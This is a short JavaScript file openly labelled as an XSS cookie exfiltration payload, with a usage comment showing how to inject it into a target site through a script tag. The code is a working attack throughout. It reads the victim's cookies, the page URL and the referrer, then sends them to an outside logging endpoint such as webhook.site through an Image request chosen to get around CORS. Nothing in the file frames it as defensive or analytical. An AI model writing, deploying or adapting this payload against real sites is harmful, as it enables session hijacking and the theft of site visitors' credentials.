/* * XSS Cookie Exfiltration Payload (Dynamic)
 * File: xss_payload.js
 * * Usage on Target Site (example):
 * <script src="https://yourusername.github.io/xss_payload.js?log=https://webhook.site/YOUR_ID"></script>
 */

function exfiltrateCookie() {
    // 1. Get the URL parameters of the script's source (where the script is hosted)
    // We use document.currentScript to find the <script> tag that executed this code.
    const scriptTag = document.currentScript;
    if (!scriptTag) {
        console.error("Payload failed: Could not determine script source.");
        return;
    }

    const scriptUrl = new URL(scriptTag.src);
    const urlParams = scriptUrl.searchParams;
    
    // 2. Extract the logging endpoint from the 'log' parameter
    const LOG_ENDPOINT_URL = urlParams.get('log'); 
    
    if (!LOG_ENDPOINT_URL) {
        console.error("Payload failed: No 'log' parameter found in script URL.");
        return;
    }

    // Attempt to steal cookies and other data
    const stolenCookie = encodeURIComponent(document.cookie);
    const pageUrl = encodeURIComponent(window.location.href);
    const referrer = encodeURIComponent(document.referrer);

    // Build the full exfiltration URL using stolen data
    // Data is sent via a GET request using an Image object to avoid CORS restrictions
    const exfilUrl = `${LOG_ENDPOINT_URL}` + 
                     `?cookie=${stolenCookie}` + 
                     `&page=${pageUrl}` +
                     `&ref=${referrer}`;

    // 3. Trigger the data exfiltration
    new Image().src = exfilUrl;
    
    console.log("XSS Payload executed. Data sent to logging endpoint.");
}

// Execute the function
exfiltrateCookie();
